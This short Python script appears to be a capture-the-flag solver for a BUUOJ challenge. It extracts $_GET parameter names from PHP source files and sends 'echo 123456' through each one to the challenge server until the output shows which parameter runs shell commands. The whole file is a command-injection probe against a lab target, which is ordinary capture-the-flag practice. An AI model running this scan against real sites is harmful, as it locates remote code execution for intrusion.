import re
import os
import requests

files = os.listdir(r'/home/kali/Desktop/src/')  # 获取路径下的所有文件
reg = re.compile(r'(?<=_GET\[\').*(?=\'\])')  # 设置正则
for i in files:  # 从第一个文件开始
    url = "http://2f097f55-a139-4f68-8245-e8979db47a78.node5.buuoj.cn:81/" + i
    f = open(r"/home/kali/Desktop/src/" + i, encoding='UTF-8')  # 打开这个文件
    data = f.read()  # 读取文件内容
    f.close()  # 关闭文件
    result = reg.findall(data)  # 从文件中找到GET请求
    for j in result:  # 从第一个GET参数开始
        payload = url + "?" + j + "=echo 123456"  ##尝试请求次路径，并执行命令
        print(payload)  # 输出payload
        html = requests.get(payload)  # 获取返回内容
        if "123456" in html.text:
            print("就是它了！：")  # 判断返回内容有123456的及可以利用
            print(payload)
            exit(1)
